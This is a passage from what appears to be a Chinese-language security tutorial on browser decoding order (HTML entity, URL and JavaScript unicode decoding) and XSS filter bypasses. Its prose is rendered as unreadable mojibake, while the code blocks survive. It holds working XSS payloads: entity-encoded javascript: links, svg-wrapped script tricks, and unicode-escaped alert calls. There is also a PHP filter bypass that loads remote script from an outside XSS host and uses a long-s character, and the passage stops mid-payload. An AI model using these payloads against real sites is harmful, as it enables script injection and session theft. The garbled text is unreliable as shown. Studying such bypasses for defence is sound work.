html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºçš„æ˜¯ç»è¿‡è½¬ä¹‰çš„å†…å®¹ï¼Œçœ‹ä¸Šå»æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ ‡ç­¾è¯­è¨€ï¼Œä½†æ­¤æ—¶ä¸ä¼šè§¦å‘xssï¼Œå› ä¸ºå¤„äºâ€œæ•°æ®çŠ¶æ€â€æ—¶ï¼Œä¸ä¼šè½¬æ¢åˆ°â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œå°±ä¸ä¼šå»ºç«‹æ–°æ ‡ç­¾ã€‚å› æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨å­—ç¬¦å®ä½“ç¼–ç è¿™ä¸ªè¡Œä¸ºæ¥è½¬ä¹‰ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä»è€Œç¡®ä¿ç”¨æˆ·è¾“å…¥çš„æ•°æ®åªèƒ½è¢«è§£ææˆâ€œæ•°æ®â€ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢çš„å†…å®¹ï¼Œå°±æ˜¯æ­£å¸¸çš„è½¬ä¹‰æ˜¾ç¤ºï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(4)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è€Œå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼Œå°±ç±»ä¼¼äºsrcï¼Œherfè¿™æ ·çš„å±æ€§å€¼è¢«ç¼–ç ï¼Œä»–ä¹Ÿæ˜¯ä¼šå…ˆè¿›è¡ŒHtmlè§£ç çš„ï¼Œæ¯”å¦‚ä¸‹é¢çš„è¯­å¥ï¼Œä¼šå…ˆå¯¹é‡Œé¢htmlè§£ç ï¼Œå†ç»§ç»­å¾€ä¸‹æ‰§è¡Œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>  <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†æ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯RCDATAè½¬æ€ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹HTMLä¸­æœ‰äº”ç±»å…ƒç´ ï¼š</p><ol><li>ç©ºå…ƒç´ (Void elements)ï¼Œå¦‚<code>&lt;area&gt;,&lt;br&gt;,&lt;base&gt;</code>ç­‰ç­‰</li><li>åŸå§‹æ–‡æœ¬å…ƒç´ (Raw text elements)ï¼Œæœ‰<code>&lt;script&gt;</code>å’Œ<code>&lt;style&gt;</code></li><li>RCDATAå…ƒç´ (RCDATA elements)ï¼Œæœ‰<code>&lt;textarea&gt;</code>å’Œ<code>&lt;title&gt;</code></li><li>å¤–éƒ¨å…ƒç´ (Foreign elements)ï¼Œä¾‹å¦‚MathMLå‘½åç©ºé—´æˆ–è€…SVGå‘½åç©ºé—´çš„å…ƒç´ </li><li>åŸºæœ¬å…ƒç´ (Normal elements)ï¼Œå³é™¤äº†ä»¥ä¸Š4ç§å…ƒç´ ä»¥å¤–çš„å…ƒç´ </li></ol><p>äº”ç±»å…ƒç´ çš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><ol><li>ç©ºå…ƒç´ ï¼Œä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼ˆå› ä¸ºå®ƒä»¬æ²¡æœ‰é—­åˆæ ‡ç­¾ï¼Œæ²¡æœ‰å†…å®¹èƒ½å¤Ÿæ”¾åœ¨å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ä¸­é—´ï¼‰ã€‚</li><li>åŸå§‹æ–‡æœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€‚</li><li>RCDATAå…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ã€‚</li><li>å¤–éƒ¨å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š</li><li>åŸºæœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š</li></ol><p>æ³¨æ„åˆ°RCDATAä¸­æœ‰<code>&lt;textarea&gt;</code>å’Œ<code>&lt;title&gt;</code>ä¸¤ä¸ªå±æ€§å¹¶ä¸”æœ‰å­—ç¬¦å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å½“å®ä½“å­—ç¬¦å‡ºç°åœ¨è¿™ä¸¤ä¸ªæ ‡ç­¾é‡Œé¢çš„æ—¶å€™ï¼Œå®ä½“å­—ç¬¦ä¼šè¢«è¯†åˆ«ï¼Œåšä¸€ä¸ªHTMLç¼–ç è§£æï¼Œæ‰€ä»¥ä¸‹é¢è¿™ä¸ªè¯­å¥è§¦å‘ä¸äº†xssï¼Œæ ‡ç­¾å†…å®¹è¢«è½¬ä¹‰äº†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœç›´æ¥æ”¾è¿›å»æ ‡ç­¾çš„å†…å®¹å‘¢ï¼Œä¸å¸¦è½¬ä¹‰å­—ç¬¦å‘¢ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ ·ä¹Ÿæ˜¯ä¸ä¼šè§¦å‘xssçš„ï¼Œåœ¨è¿™ä¸¤ä¸ªæ ‡ç­¾å†…ï¼Œæ˜¯ä¸ä¼šè¿›å…¥â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ï¼Œä¹Ÿå°±æ˜¯è¯´é‡Œé¢çš„å†…å®¹ä¸ä¼šå½“åšHTMLä»£ç è§£æï¼Œåªè®¤<code>&lt;textarea&gt;</code>æˆ–<code>&lt;title&gt;</code>æ ‡ç­¾æ¥ç»“æŸ</p><p>å¦å¤–è¿˜æœ‰ä¸€ç‚¹æ³¨æ„ï¼šæˆ‘ä»¬ä»ä¸Šé¢çš„å…ƒç´ ä¸­è¿˜å‘ç°æœ‰ä¸€ä¸ªåŸå§‹æ–‡æœ¬å…ƒç´ <code>&lt;script&gt;</code>åœ¨è¿™ä¸ªæ ‡ç­¾å†…å®¹çº³çš„æ˜¯æ–‡æœ¬ï¼Œæ‰€ä»¥æµè§ˆå™¨åœ¨è§£æåˆ°è¿™ä¸ªæ ‡ç­¾åï¼Œåé¢çš„å†…å®¹ä¸­<br>çš„ç¼–ç å¹¶ä¸ä¼šè¢«è½¬ä¹‰ã€‚æµè§ˆå™¨çœ‹ä¸æ‡‚ä¸­é—´è¿™å †ä¸œè¥¿æ˜¯å•¥ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè¢«æ‰§è¡Œã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½è®©é‡Œé¢çš„å†…å®¹è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åæ‰§è¡Œå¼¹çª—å‘¢ï¼Œä¸‹é¢ä¼šæåŠã€‚</p><h4 id="URLè§£æ"><a href="#URLè§£æ" class="headerlink" title="URLè§£æ"></a>URLè§£æ</h4><p>è¯´åˆ°urlè§£æï¼Œå¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰ï¼Œè‚¯å®šè¦æ¶‰åŠåˆ°urlç¼–ç ï¼Œæœ¬è´¨æ˜¯æŠŠä¸€ä¸ªå­—ç¬¦è½¬ä¸º%åŠ ä¸ŠUTF-8ç¼–ç å¯¹åº”çš„16è¿›åˆ¶æ•°å­—ã€‚è¿™é‡Œçš„urlè§£ææŒ‡çš„å°±æ˜¯URLè§£ç ï¼Œåœ¨æœåŠ¡ç«¯æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šè‡ªåŠ¨å¯¹è¯·æ±‚è¿›è¡Œä¸€æ¬¡URLè§£ç ã€‚ä½†æ˜¯ä»Šå¤©è¿™ç¯‡æ–‡ç« æ¶‰åŠçš„URLè§£ç æ˜¯å‘ç”Ÿåœ¨æœåŠ¡å™¨æ¥æ”¶ä¹‹åçš„ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼Œä¸ç„¶URLè§£æå™¨ä¼šè®¤ä¸ºå®ƒæ— ç±»å‹ã€‚ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­å†’å·å‰é¢çš„ä¸€æ®µURLç¼–ç å†…å®¹ï¼ŒæŠŠ<code>javascript</code>ç»™ç¼–ç äº†ï¼Œè¿™æ—¶å€™ä¸ä¼šè¢«URLè§£æå™¨è¯†åˆ«ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè§¦å‘xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ¢è¿‡æ¥å¦‚æœæ˜¯è¿™æ ·ï¼Œå¦‚ä¸‹ï¼Œç»è¿‡äº†Htmlè§£æä¹‹åï¼Œè¿›å…¥hrefï¼Œå°±å¼€å§‹urlè§£æäº†ï¼Œæ²¡æœ‰æŠŠåè®®ç»™ç¼–ç ï¼Œå¤Ÿè¢«URLè§£æå™¨æ­£ç¡®è¯†åˆ«ã€‚ç„¶åURLè§£æå™¨ç»§ç»­è§£æé“¾æ¥å‰©ä¸‹çš„éƒ¨åˆ†ï¼Œæœ€åå°±ä¼šè§¦å‘xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="JavaScript-è§£æ"><a href="#JavaScript-è§£æ" class="headerlink" title="JavaScript è§£æ"></a>JavaScript è§£æ</h4><p>å¥½åƒåªå¯¹UNICODEç¼–ç èµ·ä½œç”¨ï¼Œä¹Ÿå°±æ˜¯å½¢å¦‚<code>\u4e00</code>ï¼Œå‰å¯¼çš„ u è¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªunicode å­—ç¬¦ï¼Œå½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚<code>&lt;script&gt; &lt;style&gt;</code>è¿™æ ·çš„æ ‡ç­¾ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JSè§£ææ¨¡å¼ï¼Œè€Œ<code>src</code>ã€ <code>href</code>åè¾¹åŠ å…¥çš„javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥JS çš„è§£ææ¨¡å¼ã€‚</p><p>ä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šjsè§£æçš„å­—ç¬¦ä¸ä¸€å®šå…¨éƒ¨éƒ½ä¼šå½“æˆjsä»£ç è§£æï¼Œéœ€è¦åˆ†æƒ…å†µï¼Œè½¬ä¹‰åºåˆ—æ”¾åœ¨3ä¸ªéƒ¨åˆ†ï¼šå­—ç¬¦ä¸²ä¸­ï¼Œæ ‡è¯†ç¬¦åç§°ä¸­å’Œæ§åˆ¶å­—ç¬¦ä¸­ã€‚</p><p>å…¶ä¸­å­—ç¬¦ä¸²ï¼Œå’Œæ§åˆ¶å­—ç¬¦éƒ½æ˜¯ä¼šè¢«è½¬ä¹‰æˆæ–‡æœ¬ï¼Œä¸ä¼šå½“åšjsä»£ç çš„ä¸€éƒ¨åˆ†æ‰§è¡Œï¼Œæœ‰å“ªäº›æ˜¯æ§åˆ¶å­—ç¬¦ï¼Ÿæ¯”å¦‚å•åŒå¼•å·ã€æ‹¬å·ç­‰è½¬ç§»ä¹‹ååªå½“æˆæ–‡æœ¬çœ‹å¾…ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶alertè¯­å¥é‡Œé¢è™½ç„¶<code>\u0027</code>è¢«è½¬ä¹‰æˆå•å¼•å·ï¼Œä½†æ˜¯åªæ˜¯æ–‡æœ¬ï¼Œå¹¶ä¸æ˜¯jsè¿è¡Œä»£ç çš„ä¸€éƒ¨åˆ†ï¼Œç›¸å½“äºæ­¤æ—¶å·®å•ä¸ªå¼•å·é—­åˆï¼Œæ‰€ä»¥æ˜¯ä¸ä¼šæ‰§è¡Œçš„ï¼Œåˆæ¯”å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ç»è¿‡jsè§£ç ä¹‹åå·¦å³æ‹¬å·éƒ½è¢«å½“æˆæ–‡æœ¬ï¼Œç›¸å½“äºalertå‘½ä»¤æ²¡æœ‰äº†æ‹¬å·ï¼Œä¹Ÿè¿è¡Œä¸æ¥</p><p>ä½†æ˜¯å¯¹äºåœ¨æ ‡è¯†ç¬¦åç§°ä¸­æ—¶ï¼Œå®ƒä¼šè¢«è§£ç å¹¶è§£é‡Šä¸ºæ ‡è¯†ç¬¦åç§°çš„ä¸€éƒ¨åˆ†ï¼Œä¾‹å¦‚å‡½æ•°åï¼Œå±æ€§åç­‰ç­‰ï¼Œæ¯”å¦‚å°†<code>alert</code>å…³é”®å­—ç¼–ç åï¼Œå½“è§£ç ä¹‹åä»–ä¼šæˆä¸ºjsæ‰§è¡Œä»£ç çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œå¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ä¸€äº›XSSä¾‹å­åˆ†æ"><a href="#ä¸€äº›XSSä¾‹å­åˆ†æ" class="headerlink" title="ä¸€äº›XSSä¾‹å­åˆ†æ"></a>ä¸€äº›XSSä¾‹å­åˆ†æ</h3><p><strong>ä¾‹å­ä¸€</strong>ï¼šå†æ¥å›çœ‹HTMLç¼–ç é‡Œé¢çš„è¿™æ ·ä¸€ä¸ªä¾‹å­ï¼Œè¿™ä¸ªä¾‹å­æ˜¯å¯ä»¥è§¦å‘xssçš„ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span></span></span><br><span class="line"><span class="tag"><span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å›é¡¾ä¸€éæµç¨‹ï¼Œå…ˆæ˜¯Htmlè§£ç ï¼Œå˜æˆä¸‹é¢çš„æ ·å­ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(15)"</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å†æ¥URLè§£ç ï¼Œåè®®æ²¡æœ‰ç¼–ç ï¼Œå¯ä»¥æ­£å¸¸è§£æï¼Œå˜æˆä¸‹é¢çš„æ ·å­ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(15)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿›å…¥jsè§£æçš„é˜¶æ®µï¼Œè§£æçš„æ˜¯å…³é”®å­—ï¼Œå¯ä»¥å½“åšjsä»£ç æ‰§è¡Œï¼Œæœ€åè¿˜æ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œçš„</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(15)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä¾‹å­äºŒ</strong>ï¼š ä¸Šé¢çš„htmlç¼–ç ç•™ä¸‹çš„ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•ç»•è¿‡HTMLåŸå§‹æ–‡æœ¬å…ƒç´ è¿›è€Œæ‰§è¡ŒHTMLè½¬ä¹‰å‘¢ï¼Œæ¶‰åŠåˆ°<code>&lt;svg&gt;</code>çš„é­”åŠ›ï¼Œé‚£æ˜¯ä¸€ç§ç‰¹æ®Šçš„è§¦å‘æ•ˆæœï¼Œå•çº¯scriptæ ‡ç­¾å†…åŠ è½½htmlå®ä½“ç¼–ç ï¼Œåªä¼šå½“åšæ–‡æœ¬ï¼Œæ²¡æœ‰ä»»ä½•è§¦å‘ç»“æœï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img src="https://s2.ax1x.com/2019/09/10/napYrV.png" alt="napYrV.png"></p><p>ä½†æ˜¯å½“å¤–é¢åŠ ä¸Š<code>&lt;svg&gt;</code>ä¼šå¦‚ä½•ï¼Ÿå‡ºå‘äº†å¼¹çª—ï¼Œè¿™åˆæ˜¯ä¸ºä½•ï¼Ÿ</p><p><img src="https://s2.ax1x.com/2019/09/10/napWIe.png" alt="napWIe.png"></p><p>æ˜¯å› ä¸º<code>&lt;svg&gt;</code>æ ‡ç­¾å±äºäº”å¤§å…ƒç´ ä¸­çš„å¤–éƒ¨å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è§£æåˆ°<code>&lt;svg&gt;</code>æ ‡ç­¾æ—¶ï¼Œæµè§ˆå™¨å°±å¼€å§‹ä½¿ç”¨ä¸€å¥—æ–°çš„æ ‡å‡†å¼€å§‹è§£æåé¢çš„å†…å®¹ï¼Œç›´åˆ°ç¢°åˆ°é—­åˆæ ‡ç­¾<code>&lt;/svg&gt;</code>ã€‚è€Œåœ¨è¿™ä¸€å¥—æ–°çš„æ ‡å‡†éµå¾ªXMLè§£æè§„åˆ™ï¼Œåœ¨XMLä¸­å®ä½“ç¼–ç ä¼šè‡ªåŠ¨è½¬ä¹‰ï¼Œé‡æ–°æ¥ä¸€éæ ‡ç­¾å¼€å¯çŠ¶æ€ï¼Œæ­¤æ—¶å°±ä¼šæ‰§è¡Œxssäº†ã€‚</p><p><strong>ä¾‹å­ä¸‰</strong>ï¼šä¸»è¦æ˜¯æ¥æºäºæˆ‘æœ€è¿‘è§åˆ°çš„ä¸€ä¸ªé¢˜ç›®ï¼Œä½¿ç”¨äº†å¦å¤–çš„ç¼–ç æ–‡å­—ç»•è¿‡ï¼Œè¿™ä¸ªé¢˜ç›®è®¾è®¡å¾—å¾ˆå·§å¦™ï¼Œæˆ‘è¿™é‡Œç”¨phpæ¨¡æ‹Ÿä¸€ä¸‹å†™äº†ä¸ªåå°ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line"><span class="comment">// $name = "&lt;script&gt;alert(1)&lt;/script&gt;";</span></span><br><span class="line"> $name =  strtoupper($name);</span><br><span class="line"> <span class="keyword">echo</span> $name;</span><br><span class="line"> <span class="keyword">if</span>(preg_match(<span class="string">"/&lt;[A-Z0-9]+/"</span>, $name) !== <span class="number">0</span>)&#123;</span><br><span class="line"> $name = preg_replace(<span class="string">'/&lt;/'</span>, <span class="string">'&lt;_'</span>, $name, $count=<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> $name;</span><br></pre></td></tr></table></figure><p>å¦‚æœç›´æ¥è¾“å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œå°±ä¼šå˜æˆ<code>&lt;_SCRIPT&gt;ALERT(1)&lt;/SCRIPT&gt;</code>ï¼Œè¿™é‡Œé¢è¦è§¦å‘xssï¼Œéœ€è¦ç»•è¿‡ä¸¤ä¸ªæ¡ä»¶ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯å¤§å†™çš„é—®é¢˜ï¼Œjsæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥ç›´æ¥åœ¨æ ‡ç­¾å†…å†™å¼¹çª—è„šæœ¬æ˜¯ä¸å¤ªå¯è¡Œçš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥å¼•å…¥å¤–éƒ¨çš„jsï¼Œæ¯”å¦‚<code>&lt;scriptv src=//xs.sb/idqS&gt;&lt;/script&gt;</code>ï¼Œè¿™å°±å¯ä»¥ç»•è¿‡ã€‚</p><p>å¦å¤–å°±æ˜¯è¦ç»•è¿‡<code>&lt;_</code>çš„é—®é¢˜ï¼Œå› ä¸ºåå°åŒ¹é…çš„æ˜¯<code>&lt;</code>ç¬¦å·åé¢æ¥ä¸Šæ­£å¸¸çš„å­—æ¯ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯ä¸æ­£å¸¸çš„è‹±æ–‡å­—æ¯å‘¢ï¼Ÿè¿™é‡Œåˆšå¥½æœ‰å¦å¤–ä¸€ä¸ªæ¡ä»¶å°±æ˜¯è½¬åŒ–å¤§å†™çš„è¿™ä¸ªæ“ä½œï¼Œè¿™ä¸ªæ“ä½œå¾ˆå¦™ï¼Œå› ä¸ºHTMLæ ‡ç­¾æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œè¿™æ ·æˆ‘ä»¬ä½¿ç”¨ä¸‹å›¾çš„è¿™ä¸ªæ‹‰ä¸å­—æ¯ï¼Œå½“è½¬åŒ–æˆå¤§å†™çš„è¯å°±åˆšå¥½æ˜¯Sï¼Œè€Œä¸”å¥½åƒæ˜¯åªæœ‰è¿™ä¸ªæ‹‰ä¸æ–‡æ‰æœ‰è¿™æ ·çš„æ•ˆæœã€‚</p><p><img src="https://s2.ax1x.com/2019/09/10/naM00g.png" alt="naM00g.png" style="zoom: 30%;"></p><p>å¦™å•Šï¼Œæœ€åçš„payloadï¼š<code>&lt;Å¿cript 